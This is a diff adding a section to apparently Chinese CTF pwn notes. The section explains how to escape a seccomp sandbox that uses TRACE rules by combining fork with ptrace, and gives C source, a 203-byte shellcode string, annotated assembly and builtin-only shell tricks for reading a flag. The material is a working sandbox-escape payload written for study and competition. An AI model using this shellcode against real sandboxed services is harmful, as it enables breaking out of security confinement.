@@ -152,6 +152,175 @@ pop rax
 syscall
 ```
 
+### fork ptrace
+> 有时我们会遇到返回TRACE的沙箱，并且题目没有禁用fork和ptrace，这就给了我们绕过沙箱的手段
+下面是一个示例程序，我们可以看到，题目对execve,execveat,open,openat,openat2都加了限制，但返回的不是KILL，而是TRACE;
+于是我们就可以通过fork加ptrace的方式绕过沙箱，拿到shell
+```c
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/ptrace.h>
+#include <seccomp.h>
+#include <time.h>
+
+struct timespec t = {1,0};
+
+void sandbox()
+{
+    scmp_filter_ctx ctx;
+    ctx = seccomp_init(SCMP_ACT_ALLOW);
+    seccomp_rule_add(ctx,SCMP_ACT_TRACE(0),SCMP_SYS(execve),0);
+    seccomp_rule_add(ctx,SCMP_ACT_TRACE(1),SCMP_SYS(execveat),0);
+    seccomp_rule_add(ctx,SCMP_ACT_TRACE(2),SCMP_SYS(open),0);
+    seccomp_rule_add(ctx,SCMP_ACT_TRACE(3),SCMP_SYS(openat),0);
+    seccomp_rule_add(ctx,SCMP_ACT_TRACE(4),SCMP_SYS(openat2),0);
+    seccomp_load(ctx);
+}
+
+int main()
+{
+    sandbox();
+
+    // fork出子进程
+    pid_t pid = syscall(SYS_fork);
+
+    if(pid<0)
+    {
+        // fork错误直接退出
+        syscall(SYS_write,STDOUT_FILENO,"fork error!\n",12);
+        syscall(SYS_exit,0);
+    }
+
+    if(pid==0)
+    {
+        // 子进程
+        // 不断执行sleep(1),printf("child execve\n"),execve("/bin/bash",0,0)
+        while(1)
+        {
+            syscall(SYS_nanosleep,t,0);
+            syscall(SYS_write,STDOUT_FILENO,"child execve\n",13);
+            syscall(SYS_execve,"/bin/bash",0,0);
+        }
+    }
+    else
+    {
+        // 父进程
+        // 首先attach到子进程上
+        syscall(SYS_ptrace,PTRACE_ATTACH,pid,0,0);
+        syscall(SYS_write,STDOUT_FILENO,"father attach\n",14);
+        while(1)
+        {
+            // 不断等待子进程改变状态，在本题即为等待子进程触发seccomp然后stop
+            syscall(SYS_wait4,pid,0,0,0);
+            // 设置跟踪seccomp,并且在子进程触发seccomp时stop子进程
+            syscall(SYS_ptrace,PTRACE_SETOPTIONS,pid,0,PTRACE_O_TRACESECCOMP);
+            // 使子进程继续执行，并且此时没有了seccomp的检测，即成功绕过seccomp
+            syscall(SYS_ptrace,PTRACE_CONT,pid,0,0);
+        }
+    }
+}
+```
+编写成shellcode如下,去掉了中间用write输出的提示信息,长度为203字节
+```python
+b'H\xc7\xc09\x00\x00\x00\x0f\x05H\x85\xc0\x0f\x88\xad\x00\x00\x00H\x83\xf8\x00tiI\x89\xc0L\x89\xc6H\xc7\xc0e\x00\x00\x00H\xc7\xc7\x10\x00\x00\x00H1\xd2M1\xd2\x0f\x05L\x89\xc7H1\xf6H1\xd2M1\xd2H\xc7\xc0=\x00\x00\x00\x0f\x05H\xc7\xc7\x00B\x00\x00L\x89\xc6H1\xd2I\xc7\xc2\x80\x00\x00\x00H\xc7\xc0e\x00\x00\x00\x0f\x05H\xc7\xc7\x07\x00\x00\x00L\x89\xc6H1\xd2M1\xd2H\xc7\xc0e\x00\x00\x00\x0f\x05\xeb\xb3j\x00j\x01H\x89\xe7H1\xf6H\xc7\xc0#\x00\x00\x00\x0f\x05H\xc7\xc0h\x00\x00\x00PH\xb8/bin/basPH\x89\xe7H\xc7\xc6\x00\x00\x00\x00H1\xd2H\xc7\xc0;\x00\x00\x00\x0f\x05\xeb\xc2H\xc7\xc0<\x00\x00\x00H1\xff\x0f\x05'
+```
+汇编也放一下
+```x86asm
+_start:
+    /* fork() */
+    mov rax,57
+    syscall
+
+    /* if(pid<0) exit(0) */
+    test rax,rax
+    js _exit
+
+    /* if(pid==0) */
+    cmp rax,0
+    je child_process
+
+parent_process:
+    /* save pid with r8 */
+    mov r8,rax
+    mov rsi,r8
+
+    /* ptrace(PTRACE_ATTACH,pid,0,0); */
+    mov rax,101
+    mov rdi,0x10
+    xor rdx,rdx
+    xor r10,r10
+    syscall
+
+monitor_child:
+    /* wait4(pid,0,0,0); */
+    mov rdi,r8
+    xor rsi,rsi
+    xor rdx,rdx
+    xor r10,r10
+    mov rax,61
+    syscall
+
+    /* ptrace(PTRACE_SETOPTIONS, child_pid, 0, PTRACE_O_TRACESECCOMP) */
+    mov rdi,0x4200 /* PTRACE_SETOPTIONS */
+    mov rsi,r8
+    xor rdx,rdx
+    mov r10,0x00000080 /* PTRACE_O_TRACESECCOMP */
+    mov rax,101
+    syscall
+
+    /* ptrace(PTRACE_CONT,pid,0,0) */
+    mov rdi,0x7
+    mov rsi,r8
+    xor rdx,rdx
+    xor r10,r10
+    mov rax,101
+    syscall
+
+    jmp monitor_child
+
+child_process:
+    /* syscall(SYS_nanosleep,t,0) */
+    push 0
+    push 1
+    mov rdi,rsp
+    xor rsi,rsi
+    mov rax,0x23
+    syscall
+
+    /* execve("/bin/bash",0,0) */
+    mov rax,0x0068 /* "h\x00" */
+    push rax
+    mov rax,0x7361622f6e69622f /* "/bin/bas" */
+    push rax
+    mov rdi,rsp
+    mov rsi,0
+    xor rdx,rdx
+    mov rax,59
+    syscall
+
+    jmp child_process
+
+_exit:
+    /* exit(0) */
+    mov rax,60
+    xor rdi,rdi
+    syscall
+
+```
+
+注意一下这样最终拿到的shell仍然是在沙箱环境下的，除了基本的cd,pwd,echo，很多命令执行不了，而且echo也只有部分功能
+这边给出ls和读flag的方法
+```shell
+# ls
+echo *
+
+# cat flag
+read -r f < flag
+echo ${f}
+```
+
 ## 32位
 ### execve
 #### 较短 21字节
